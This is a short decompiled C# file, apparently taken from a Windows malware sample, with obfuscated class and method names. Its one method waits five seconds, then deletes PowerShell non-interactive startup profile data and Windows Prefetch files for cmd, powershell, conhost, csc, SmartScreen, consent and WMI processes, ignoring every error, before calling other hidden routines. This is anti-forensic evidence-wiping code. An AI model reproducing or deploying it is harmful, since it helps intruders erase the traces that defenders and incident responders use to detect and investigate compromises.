using System;
using System.IO;
using System.Threading;

namespace ns0
{
	// Token: 0x02000033 RID: 51
	internal static class Class10
	{
		// Token: 0x060001B8 RID: 440 RVA: 0x00016C28 File Offset: 0x00014E28
		public static void smethod_0()
		{
			Thread.Sleep(5000);
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\Windows\\PowerShell");
			try
			{
				foreach (string text2 in Directory.GetFiles(text, "StartupProfileData-NonInteractive*", SearchOption.TopDirectoryOnly))
				{
					try
					{
						File.Delete(text2);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			string[] array2 = new string[] { "SMARTSCREEN.EXE", "CMD.EXE", "CONHOST.EXE", "POWERSHELL.EXE", "CONSENT.EXE", "CSC.EXE", "CVTRES.EXE", "WINMGMT.EXE", "WMIADAPT.EXE" };
			string text3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Prefetch");
			if (!Directory.Exists(text3))
			{
				return;
			}
			int num = 0;
			foreach (string text4 in array2)
			{
				foreach (string text5 in Directory.EnumerateFiles(text3, "*" + text4 + "*.pf", SearchOption.TopDirectoryOnly))
				{
					try
					{
						File.SetAttributes(text5, FileAttributes.Normal);
						File.Delete(text5);
						num++;
					}
					catch (UnauthorizedAccessException)
					{
					}
					catch (IOException)
					{
					}
				}
			}
			Class13.smethod_0(false);
			GClass0.smethod_0();
			GClass1.smethod_0();
		}
	}
}
